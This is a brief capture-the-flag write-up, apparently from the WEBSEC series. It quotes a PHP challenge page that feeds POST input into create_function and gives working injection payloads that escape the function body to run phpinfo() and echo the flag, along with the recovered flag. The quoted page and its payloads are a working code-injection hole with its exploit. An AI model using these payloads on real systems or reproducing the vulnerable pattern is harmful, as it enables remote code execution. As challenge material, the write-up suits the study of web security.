'''
<?php
ini_set('display_errors', 'on');
ini_set('error_reporting', E_ALL);

$success = '
<div class="alert alert-success alert-dismissible" role="alert">
    <button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button>
    Function declared.
</div>
';

include "flag.php";

if (isset ($_POST['c']) && !empty ($_POST['c'])) {
    $fun = create_function('$flag', $_POST['c']);
    print($success);
    //fun($flag);
    if (isset($_POST['q']) && $_POST['q'] == 'checked') {
        die();
    }
}
?>
'''

STEP 1: Bypass create_function in php
<?php
$funstring = 'return -1 * var_dump($a[""]);}phpinfo();/*"]';
$unused = create_function('',$funstring);
?>
Gives the phpinfo page   

STEP 2: return -1 * var_dump($a[""]);}echo $flag;/*"]';
OUTPUT: WEBSEC{HHVM_was_right_about_not_implementing_eval}

ALTERNATIVE: } echo $flag; {
OUTPUT: WEBSEC{HHVM_was_right_about_not_implementing_eval}


REFERENCE: https://www.exploit-db.com/exploits/32417
